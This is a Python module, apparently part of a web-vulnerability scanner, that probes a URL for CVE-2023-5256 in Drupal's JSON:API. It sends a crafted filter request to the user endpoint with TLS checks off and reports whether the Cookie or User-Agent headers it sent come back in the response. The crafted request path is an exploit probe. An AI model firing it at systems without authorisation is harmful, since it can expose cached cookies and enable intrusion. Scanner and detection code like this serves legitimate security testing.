#!/usr/bin/env python3
"""
https://github.com/elttam/publications/blob/master/writeups/CVE-2023-5256.md
"""
from utils.style import Colors, Identify
from utils.utils import configure_logger, requests

logger = configure_logger(__name__)

EXCLUDED_STATUS_CODES = [301, 302, 307, 308, 401, 403, 404]

HEADERS_TO_CHECK = ["Cookie", "User-Agent"]


def drupaljsonapi(url: str, headers: dict) -> bool:
    payload = "/jsonapi/user/user?filter[a-labex][condition][path]=cachingyourcookie"
    uri = f"{url}{payload}"

    try:
        req = requests.get(
            uri,
            headers=headers,
            verify=False,
            timeout=10,
            allow_redirects=False
        )

        if req.status_code in EXCLUDED_STATUS_CODES:
            return False

        if "jsonapi" not in req.text:
            return False

        headers_reflected = [
            h for h in HEADERS_TO_CHECK
            if (value := headers.get(h)) and value in req.text
        ]

        checkable_count = sum(1 for h in HEADERS_TO_CHECK if h in headers)

        if headers_reflected:
            level = Identify.confirmed if len(headers_reflected) == checkable_count else Identify.behavior
            detail = f"Headers reflected: {', '.join(headers_reflected)}"
            print(
                f" {level} | CVE-2023-5256 | {Colors.BLUE}{uri}{Colors.RESET}"
                f" | {req.status_code} | {detail}"
            )
            return True

    except requests.exceptions.Timeout:
        logger.error("request timeout %s", uri)
    except requests.exceptions.ConnectionError as e:
        logger.error("connection error %s: %s", uri, e)
    except Exception as e:
        logger.error("request error %s: %s", uri, e)

    return False